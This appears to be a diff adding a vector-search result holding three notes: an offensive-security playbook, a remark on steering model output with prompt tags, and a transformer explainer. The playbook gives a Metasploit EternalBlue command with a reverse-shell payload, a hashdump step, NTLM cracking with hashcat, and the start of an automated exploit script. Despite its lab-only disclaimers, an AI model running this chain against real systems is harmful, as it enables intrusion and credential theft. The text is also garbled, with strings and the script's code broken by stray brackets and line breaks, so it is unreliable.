@@ -1,0 +1,280 @@
+
+'matches': [
+{
+    'id': 'md_10', 'metadata': {
+        'category': 'obsidian_note','filename': 'offsec-playbook', 'text': '\n' '# Offensive Security Lab Playbook — '
+        'Metasploit → Hash Extraction → Hashcat '
+        '(Single-File Guide)\n'
+        '\n''> **For authorized lab or sanctioned '
+        'assessments only.** Everything here is '
+        'designed for **private test networks** you '
+        'control. Do not use against systems you ''don’t have explici written permission to ''test.\n'
+        '## Contents\n'
+        '1. [Scope & Legal
+](#scope--legal)\n'
+                                   '2. [Prerequisites
+                ](#prerequisites)\n'
+                                   '3. [Quick Start
+                ](#quick-start)\n'
+                                   '4. [Autopwn Script '
+                                   '(`autopwn.sh`)
+                ](#autopwn-script-autopwnsh)\n'
+                                   '5. [Hashcat Cheat '
+                                   'Sheet
+                ](#hashcat-cheat-sheet)\n'
+                                   '6. [Metasploit Workflow '
+                                   'Reference
+                ](#metasploit-workflow-reference)\n'
+                                   '7. [Post-Exploitation & Pivoting '
+                                   '(Lab)
+                ](#post-exploitation--pivoting-lab)\n'
+                                   '8. [Reporting '
+                                   'Template
+                ](#reporting-template)\n'
+                                   '9. [Troubleshooting
+                ](#troubleshooting)\n'
+                                   '\n'
+                                   '---\n'
+                                   '\n'
+                                   '## Scope & Legal\n'
+                                   '\n'
+                                   '- Operate **only** inside lab ranges or '
+                                   'authorized scopes (e.g., `10.0.0.0/8`, '
+                                   '`172.16.0.0/12`, `192.168.0.0/16`).  \n'
+                                   '- Keep a signed rules-of-engagement (ROE) '
+                                   'for any real assessment.  \n'
+                                   '- Log actions and timestamps; export '
+                                   'results for a defensible report.\n'
+                                   '\n'
+                                   '---\n'
+                                   '\n'
+                                   '## Prerequisites\n'
+                                   '\n'
+                                   '- **OS:** Kali/Parrot or a Linux distro '
+                                   'with Metasploit, Hashcat, Nmap, '
+                                   'PostgreSQL.\n'
+                                   '- **GPU:** Optional but recommended for '
+                                   'Hashcat (CUDA/OpenCL drivers installed).\n'
+                                   '- **Wordlists:** Place common lists like '
+                                   '`rockyou.txt` at `/usr/share/wordlists/`.\n'
+                                   '- **Database:** Metasploit’s PostgreSQL '
+                                   'service enabled (`msfdb init` on Kali if '
+                                   'needed).\n'
+                                   '\n'
+                                   '---\n'
+                                   '\n'
+                                   '## Quick Start\n'
+                                   '\n'
+                                   '```bash\n'
+                                   '# 1) Discover targets (adjust subnet)\n'
+                                   'nmap -A -T4 192.168.56.0/24 -oA '
+                                   'initial_scan\n'
+                                   '\n'
+                                   '# 2) Launch Metasploit and import\n'
+                                   'msfconsole -q -x "db_import '
+                                   'initial_scan.xml; hosts; services"\n'
+                                   '\n'
+                                   '# 3) Exploit example (ONLY if target is a '
+                                   'known lab vuln)\n'
+                                   '# EternalBlue (Windows SMBv1) example — '
+                                   'lab only\n'
+                                   'msfconsole -q -x "use '
+                                   'exploit/windows/smb/ms17_010_eternalblue; '
+                                   'set RHOSTS 192.168.56.105; set PAYLOAD '
+                                   'windows/meterpreter/reverse_tcp; set LHOST '
+                                   '192.168.56.1; run"\n'
+                                   '\n'
+                                   '# 4) Post-exploitation (inside '
+                                   'meterpreter) — lab only\n'
+                                   '# hashdump > hashes.txt\n'
+                                   '\n'
+                                   '# 5) Hashcat example (NTLM)\n'
+                                   'hashcat -m 1000 -a 0 hashes.txt '
+                                   '/usr/share/wordlists/rockyou.txt '
+                                   '--potfile-path cracked.pot\n'
+                                   '```\n'
+                                   '\n'
+                                   '---\n'
+                                   '\n'
+                                   '## Autopwn Script (`autopwn.sh`)\n'
+                                   '\n'
+                                   '> This script automates **Recon → Import → '
+                                   'Targeted Exploit (if detected) → Hash '
+                                   'extraction hint**.  \n'
+                                   '> It **refuses to run** on non-private '
+                                   'ranges and asks for confirmation. Review '
+                                   'before use.\n'
+                                   '\n'
+                                   '```bash\n'
+                                   '#!/usr/bin/env bash\n'
+                                   'set -euo pipefail\n'
+                                   '\n'
+                                   '# ---------- CONFIG (edit to taste) '
+                                   '----------\n'
+                                   'SUBNET="${1:-}"\n'
+                                   'LHOST_DEFAULT="$(ip route get 1.1.1.1 '"2>/dev/null | awk '/src/ {print $7; "
+                                   'exit
+            }\')"\n'
+                                   'SCAN_OUT="initial_scan"\n'
+                                   'WORDLIST="/usr/share/wordlists/rockyou.txt"\n'
+                                   'MSFRC="$(mktemp)"\n'
+                                   '# '
+                                   '-------------------------------------------\n'
+                                   '\n'
+                                   'usage() {\n'
+                                   '  echo "Usage: $0 <private-subnet>   e.g., '
+                                   '$0 192.168.56.0/24"\n'
+                                   '  exit 1\n'
+                                   '
+            }\n'
+                                   '\n'
+                                   'is_private_subnet() {\n'
+                                   '  local net="$1"\n'
+                                   '  [
+                    [
+                        "$net" =~ ^10\\.
+                    ]
+                ] && return 0\n'
+                                   '  [
+                    [
+                        "$net" =~ ^192\\.168\\.
+                    ]
+                ] && return '
+                                   '0\n'
+                                   '  # 172.16.0.0 – 172.31.255.255\n'
+                                   '  if [
+                    [
+                        "$net" =~ '
+                                   '^172\\.([
+                            1-2
+                        ][
+                            0-9
+                        ]|3[
+                            0-1
+                        ])\\.
+                    ]
+                ]; then\n'
+                                   '    return 0\n'
+                                   '  fi\n'
+                                   '  return 1\n'
+                                   '
+            }\n'
+                                   '\n'
+                                   'confirm() {\n'
+                                   '  read -r -p "$1 [y'},
+              'score': 0.263827324,
+              'values': []
+            },
+            {'id': 'md_5',
+              'metadata': {'category': 'obsidian_note',
+                           'filename': 'North Star This isn’t magic — it’s '
+                                       'probabilities, guardrails, and logs',
+                           'text': '**North Star:** This isn’t magic — it’s '
+                                   'probabilities, guardrails, and logs. Tags '
+                                   'like `insight-only`, `real-talk`, and '
+                                   '`safe-educational` don’t change the model, '
+                                   'they tilt the context so responses pull '
+                                   'from different slices of training. The '
+                                   'system will always be bounded, monitored, '
+                                   'and probability-driven. The value is not '
+                                   'in “hacking” it, but in integrating it: '
+                                   'use it to accelerate coding, research, '
+                                   'writing, and analysis. Trust it for speed '
+                                   'and patterns, not for ultimate truth. Ride '
+                                   'it like a co-pilot with limited vision: '
+                                   'fast, helpful, not omniscient. The '
+                                   'mind-fuck is real, but the power is in '
+                                   'knowing when to lean on it, when to step '
+                                   'back, and how to stay safe while doing '
+                                   'both.'
+                },
+              'score': 0.23341848,
+              'values': []
+            },
+            {'id': 'md_4',
+              'metadata': {'category': 'obsidian_note',
+                           'filename': '02_transformer_mechanics_EN',
+                           'text': '# Transformer mechanics — shapes, passes, '
+                                   'and the 30‑D intuition\n'
+                                   '\n'
+                                   '## The forward pass at a glance\n'
+                                   '**Encoder layer** (repeated):\n'
+                                   '1) **Self‑attention** over the input '
+                                   'tokens (mix information across the '
+                                   'sequence).  \n'
+                                   '2) **Feed‑forward network (FFN)** per '
+                                   'token (two linear layers with a '
+                                   'nonlinearity).  \n'
+                                   'Each sublayer is wrapped with **residual '
+                                   'connections** and **layer norm**.\n'
+                                   '\n'
+                                   '**Decoder layer** (repeated):\n'
+                                   '- **Masked self‑attention** (can’t peek at '
+                                   'future tokens).  \n'
+                                   '- **Cross‑attention** over the encoder '
+                                   'outputs.  \n'
+                                   '- **FFN**, plus residuals + layer norm.\n'
+                                   '\n'
+                                   '> Many modern LLMs (GPT‑style) use only '
+                                   'the **decoder** stack; BERT‑style models '
+                                   'use only the **encoder** stack.\n'
+                                   '\n'
+                                   '## Shapes (keep it concrete)\n'
+                                   'Assume batch size **B**, sequence length '
+                                   '**T**, model width **D** (say **D=30** as '
+                                   'a mental image):\n'
+                                   '- Input embeddings: **(B, T, D)**  \n'
+                                   '- Projections to **Q, K, V**: three weight '
+                                   'matrices of shapes **(D, dₖ)**, **(D, '
+                                   'dₖ)**, **(D, dᵥ)** (often **dₖ = dᵥ = D / '
+                                   'heads**)  \n'
+                                   '- Attention scores: **(B, heads, T, T)** '
+                                   'from `Q @ Kᵀ / √dₖ`  \n'
+                                   '- Attention weights: **softmax(scores)**, '
+                                   'same shape  \n'
+                                   '- Context: `weights @ V` → **(B, heads, T, '
+                                   'dᵥ)** → concat heads → **(B, T, D)** → FFN '
+                                   '→ next layer\n'
+                                   '\n'
+                                   '## Your 30‑D dot‑product picture\n'
+                                   'For one head and one batch element: each '
+                                   '**qᵢ ∈ R³⁰** takes a **dot product** with '
+                                   '**every** **kⱼ ∈ R³⁰** for j=1..T → a '
+                                   'length‑T score vector. **Softmax** turns '
+                                   'that into “who matters how much,” and we '
+                                   'mix **V** with those weights.\n'
+                                   '\n'
+                                   '> Frameworks implement this as **matrix '
+                                   'multiplies** (BLAS/cuBLAS), not Python '
+                                   'loops—hence the speed on GPU/TPU.\n'
+                                   '\n'
+                                   '## Complexity and long context\n'
+                                   'Self‑attention compares **all pairs** → '
+                                   '**O(T²)** memory/compute. Long contexts '
+                                   'get expensive, so you’ll see optimizations '
+                                   'like **FlashAttention**, **sparse/linear '
+                                   'attention**, and **KV caching** for faster '
+                                   'generation.\n'
+                                   '\n'
+                                   '## Training signals\n'
+                                   '- **Tokenization**: break text into '
+                                   'subword IDs.  \n'
+                                   '- Objectives: **next‑token prediction** '
+                                   '(decoder‑only), **masked‑token '
+                                   'prediction** (encoder‑only), etc.  \n'
+                                   '- **Loss**: cross‑entropy over the '
+                                   'vocabulary at each position.  \n'
+                                   '- **Optimizer**: Adam/AdamW with '
+                                   '**learning‑rate warmup** then decay.  \n'
+                                   '- **Regularization**: dropout, label '
+                                   'smoothing; often weight decay and gradient '
+                                   'clipping.\n'
+                },
+              'score': 0.168251991,
+              'values': []
+            }
+        ],
+ 'namespace': '',
+ 'usage': {'read_units': 1
+        }
+    }
